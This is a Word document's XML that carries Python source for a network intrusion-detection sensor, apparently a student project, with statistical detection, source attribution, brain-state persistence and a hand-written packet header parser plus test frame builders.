      </w:r>
    </w:p>
    <w:p w14:paraId="2E20D7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engine="K-Means (clustering)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF9EE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50B8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packet_store.STORE.update_stats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D5C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pps, mean, z,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE0A0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ddos_candidate=zv.detail["volume_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D699B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ddos_active=zv.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6771B4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self.stats_queue:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102C5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self.stats_queue.put({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="114C5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"pps": pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381392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"mean": mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D5AA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"z_score": z,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF40A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"ddos_candidate": zv.detail["volume_candidate"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1937E4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"ddos_active": zv.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10348F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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8262B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111A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self.packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F275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self.unique_ports.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226A90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self.source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3055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self.last_time = now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723FF3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7C3E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_dominant_source(self, source_stats, total_packets):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6A4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"""Return a safely attributable source for an interval alert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275EA0B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4753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Aggregate rate/cluster detections cannot honestly name an address when</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F54C4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traffic is distributed. Only return the highest-volume source when it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F362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meets the configured dominance threshold; a missing source prevents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111783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 dispatcher from attempting an unsafe firewall block.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0E31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118626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source_stats or total_packets &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62733F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7A5BB3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src, observation = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0A32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source_stats.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414E62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key=lambda item: item[1].get("packets", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771C88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share = observation.get("packets", 0) / float(total_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB10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threshold = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE913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0.0, min(1.0, float(getattr(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAC0E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self.config, "source_attribution_min_share", 0.50))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B72E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src if share &gt;= threshold else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537D31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EBE7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_record_packet(self, raw, pkt, verdict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691FE0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"""Store a bounded snapshot in the in-memory ring buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F075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D4F4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 snapshot honours the pcap snaplen, so when privacy mode limits the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71A6EF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capture to headers the UI hex view shows exactly what was captured and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C394D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nothing more.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D61E0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1EE443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snap_len = max(64, min(128, self.config.pcap_snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360BC4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packet_store.STORE.add({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C89FF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"ts": time.time(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5509BA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"time": packet_store.now_hms(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715170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"src": pkt["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C68A4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"dst": pkt["dst"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357CAA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"proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA135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"sport": pkt["sport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658246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"dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C95C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"length": pkt["length"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DDF0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"info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416380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"verdict": verdict,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214029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"hex": raw[:snap_len].hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358148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})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC39E8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A4F4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lifecycle -----------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054609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start(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AED3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starting mantis sensor")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3176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print(self.config.summary())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469A22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threading.Thread(target=self._sniffer_thread, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2230F4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threading.Thread(target=self._analyzer_thread, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2E3D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47F12D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while self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5918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time.sleep(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170AA7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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC993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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66331F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self.shutdown()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523C03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6BB3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shutdown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CD88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print("\n[!] stopping")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FA5E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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28058A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self.pcap_writer is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779320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self.pcap_writer.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624B84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capture saved: %s (%d packets) - open it in Wireshark"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0633F5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(self.config.pcap_file, self.pcap_writer.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126242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self.export_brain_state()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA8B5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self.reporter.generate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09501D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self.print_session_summary()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617A20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4A34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print_session_summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACA9B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uptime = time.time() - self.started_at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B117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self.parser.stats()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CD01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summary = self.dispatcher.summary()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C6CC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print("\n--- session summary ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D94A5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uptime          : %.1f s" % uptime)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA7C6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frames decoded  : %d (non-IPv4 %d, malformed %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116A06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(stats["parsed"], stats["non_ipv4"], stats["malformed"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7D0E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queue drops     : %d" % self.dropped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7791BB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alerts raised   : %d %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC6AA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(summary["alerts"], summary["by_kind"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7891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IPs blocked     : %s" % (summary["blocked_ips"] or "none"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1882C2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audit log rows  : %d -&gt; %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6BC7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(self.audit_log.rows_written, self.config.log_file))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E1570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D4FE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export_brain_state(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="292F06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save what each engine learned, timestamped so we keep history</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1B6E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os.makedirs(os.path.dirname(self.brain_file) or ".", exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136EA4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base = self.brain_file.replace(".json", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A874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"%s_%s.json" % (base, time.strftime("%Y%m%d_%H%M%S"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579C45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2112FB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open(out, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="703B41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json.dump({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5F9A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"knn": self.knn_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA954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"kmeans": self.kmeans_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D18FB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"payload": self.payload_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427E84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"z_score": self.stats_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB04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"bloom": self.blacklist.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D570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}, f, indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42431E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brain saved to", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E6D8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6A10BA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failed to save brain:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED38F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2D18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import_brain_state(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E21E6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auto-load the newest saved brain on boot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15839C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base = self.brain_file.replace(".json", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7517A6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files = glob.glob("%s_*.json" % base)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274EF7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files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8232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6CE862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latest = sorted(files)[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A24F3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loading brain", latest)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66ACB8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0B2F2E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open(latest) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C22D3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 = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F26FF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key, engine in (("knn", self.knn_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262C99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("kmeans", self.kmeans_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180D4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("payload", self.payload_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DF2C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("z_score", self.stats_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBE82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("bloom", self.blacklist)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539FA8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key in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFE19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engine.import_brain(data[key])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6523CC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2978E8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failed to load brain:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8D981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1117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CDE4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start_sensor(stats_queue=None, alert_queue=None, brain_file=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D488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config=None, forward_alerts=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8A60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SensorNode(stats_queue, alert_queue, brain_file, config,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339A85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forward_alerts).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0F0F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DC6B7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1323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5E3832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start_sensor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D002108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src/sensor_node/parser.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7900009A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(232 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102405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5100C0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"""Manual decoding of Layer-2 / Layer-3 / Layer-4 headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D96B9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0179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Chapter 4 class diagram shows the Sensor composing a dedicated</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A35C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`PacketParser`; this module is that component, lifted out of the sensor's</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211699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analyzer loop. Separating it has three practical consequences:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFA827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6B8A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the decoder can be unit tested against synthetic frames with no root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A20D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privileges and no live network (supporting the V-Model unit tier);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADA0C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the offline PCAP replay tool reuses the identical decode path as the live</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1982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sensor, so replayed results are directly comparable to live results;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA05D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* malformed or truncated frames are rejected by explicit length checks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1624A4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instead of raising struct.error inside the analyzer thread, which would</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CA9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previously terminate that thread and silently stop all detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744D8B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(a reliability concern under NFR-6).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF3CC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FFF3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FR-2 requires decoding "via manual struct.unpack (no Scapy)", which is what</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322C2E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happens here - every field offset is taken from the relevant RFC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640620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2216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68BA76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46D3D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D8FC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0865EA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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DF68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B088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ETH_HEADER_LEN = 14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3878D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ETH_P_IPV4 = 0x0800        # RFC 894 EtherType for IPv4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAE07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ETH_P_VLAN = 0x8100        # IEEE 802.1Q tagged frame</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45578D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VLAN_TAG_LEN = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD249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4F4D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PROTO_ICMP = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D533F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PROTO_TCP = 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB06F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PROTO_UDP = 17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C0B2D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9929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PROTO_NAMES = {PROTO_ICMP: "ICMP", PROTO_TCP: "TCP", PROTO_UDP: "UDP"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D581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DA95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TCP flag bits, RFC 9293 section 3.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAA94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TCP_FLAGS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D13DF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(0x01, "FIN"), (0x02, "SYN"), (0x04, "RST"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7A4E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(0x08, "PSH"), (0x10, "ACK"), (0x20, "URG"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051F17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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DBC8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B407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ICMP_TYPES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA35D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0: "echo-reply", 3: "dest-unreachable", 5: "redirect",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754FD3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8: "echo-request", 11: "time-exceeded",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1273DB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01C82DB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8ECEE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A42C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decode_tcp_flags(flag_byte):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0145ED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names = [name for bit, name in TCP_FLAGS if flag_byte &amp; bit]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C1D1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", ".join(names) if names else "-"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1085926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4DDB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E5AB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PacketParser:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF3D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"""Stateless decoder: raw Ethernet frame in, normalised dict out."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E36E7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509A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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E55F7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self.parsed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F981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self.dropped_non_ipv4 = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E220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self.dropped_malformed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260C14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838D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parse(self, raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C898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"""Decode one frame. Returns a dict, or None when not decodable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F95FF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6C96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Returning None rather than raising keeps the analyzer loop simple: any</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DE5A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 that is not plaintext IPv4 TCP/UDP/ICMP is simply not analysed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153AE6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0FA7EF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raw is None or len(raw) &lt; ETH_HEADER_LEN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38ADD2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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6928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00441C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FEB9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Ethernet II header (RFC 894) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A29A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"!H" already yields the EtherType in host integer form, so compare it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B17B8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against 0x0800 directly. Passing it through ntohs() as well would</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4807E3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only produce the right answer on little-endian hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71ADD1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438C4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dst_mac, src_mac, eth_type = struct.unpack("!6s6sH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EA41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       raw[:ETH_HEADER_LEN])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D353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struct.error:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073E2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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B024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3B7614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F4BB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offset = ETH_HEADER_LEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C3C0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B870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802.1Q VLAN tag sits between the MACs and the real EtherType.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B742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Untagged handling would drop every frame on a trunked interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1587E6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eth_type == ETH_P_VLAN and len(raw) &gt;= offset + VLAN_TAG_LEN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B43B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eth_type = struct.unpack("!H", raw[offset + 2:offset + 4])[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326884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offset += VLAN_TAG_LEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA0502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2FD4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eth_type != ETH_P_IPV4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EFF8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self.dropped_non_ipv4 += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312D27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2C5671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3A16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IPv4 header (RFC 791) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E80A5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len(raw) &lt; offset + 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385603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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BF46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03122B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B1309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iph = struct.unpack("!BBHHHBBH4s4s", raw[offset:offset + 20])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545E65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struct.error:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446DD5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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44967F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5C93E4D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BE05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version = iph[0] &gt;&gt; 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E16A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ihl = (iph[0] &amp; 0x0F) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B317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version != 4 or ihl &lt; 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9BD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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F91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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564347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188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total_length = iph[2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0B4D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ttl = iph[5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB151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protocol = iph[6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40945E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src = socket.inet_ntoa(iph[8])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1709BB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dst = socket.inet_ntoa(iph[9])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6DF9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104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 = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2791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"src": src,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F8DC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"dst": dst,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3EC8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"src_mac": src_mac.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="159087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"dst_mac": dst_mac.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B4FB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"protocol_num": protocol,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1909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"proto": PROTO_NAMES.get(protocol, "OTHER"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71847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"ttl": ttl,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017CF2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"ip_total_length": total_length,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318065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"length": len(raw),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C120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"sport": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D183C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"dport": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DECF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"flags": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC48F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"payload": b"",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B94E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"info": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0123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8C64DC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A2A6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t_off = offset + ihl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC859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1D45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protocol == PROTO_TCP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F6C7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len(raw) &lt; t_off + 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7457E5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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1AF0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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0386AA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tcph = struct.unpack("!HHLLBBHHH", raw[t_off:t_off + 20])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60429C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data_off = (tcph[4] &gt;&gt; 4) * 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766BAE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data_off &lt; 20:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0C4D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data_off = 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F03E2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pkt["sport"], pkt["dport"] = tcph[0], tcph[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7311A1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pkt["seq"], pkt["ack"] = tcph[2], tcph[3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0668A1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pkt["window"] = tcph[6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77061D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pkt["flags"] = decode_tcp_flags(tcph[5])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409853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pkt["payload"] = raw[t_off + data_off:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED5BC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pkt["info"] = "%d -&gt; %d [%s] len=%d" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58AE0A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pkt["sport"], pkt["dport"], pkt["flags"], len(pkt["payload"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D544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C08C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protocol == PROTO_UDP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D676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len(raw) &lt; t_off + 8:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128254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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFA47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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1886AC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udph = struct.unpack("!HHHH", raw[t_off:t_off + 8])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018A09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pkt["sport"], pkt["dport"] = udph[0], udph[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279F65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pkt["payload"] = raw[t_off + 8:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290BE2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pkt["info"] = "%d -&gt; %d len=%d" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480BB8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pkt["sport"], pkt["dport"], len(pkt["payload"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C337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2F5D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protocol == PROTO_ICMP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442691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len(raw) &lt; t_off + 4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AD4E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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B64B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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198B70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icmp_type, icmp_code = raw[t_off], raw[t_off + 1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157920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pkt["icmp_type"], pkt["icmp_code"] = icmp_type, icmp_code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EB27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pkt["payload"] = raw[t_off + 4:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7256E5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pkt["info"] = "type=%d code=%d (%s)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA629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icmp_type, icmp_code, ICMP_TYPES.get(icmp_type, "other"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238115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13C1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52E09B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pkt["info"] = "ip protocol %d" % protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB00C0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CA9A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self.parsed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A162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return pkt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22531C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84C6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stats(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CAA6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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A53C7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"parsed": self.parsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B12DA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"non_ipv4": self.dropped_non_ipv4,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D44EE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"malformed": self.dropped_malformed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28866D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8236F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79CE4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EB63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---- frame builders, used by unit tests and the replay self-check ----------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126403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build_ipv4(payload, proto, src="192.168.1.10", dst="192.168.1.20", ttl=64):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E59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"""Assemble a valid Ethernet + IPv4 frame around a Layer-4 payload."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5269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eth = struct.pack("!6s6sH",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B053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b"\xff\xff\xff\xff\xff\xff",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626E10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b"\x00\x11\x22\x33\x44\x55",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3382B4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ETH_P_IPV4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38569C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total_len = 20 + len(payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DABD7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iph = struct.pack("!BBHHHBBH4s4s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7474AD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0x45, 0, total_len, 0, 0, ttl, proto, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B41D0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socket.inet_aton(src), socket.inet_aton(dst))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EFDD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eth + iph + payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1386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28184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375A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build_tcp(sport=44000, dport=80, flags=0x02, data=b"", **kw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8534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tcp = struct.pack("!HHLLBBHHH", sport, dport, 0, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173EE5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5 &lt;&lt; 4, flags, 8192, 0, 0)</w:t>
      </w:r>
    </w:p>
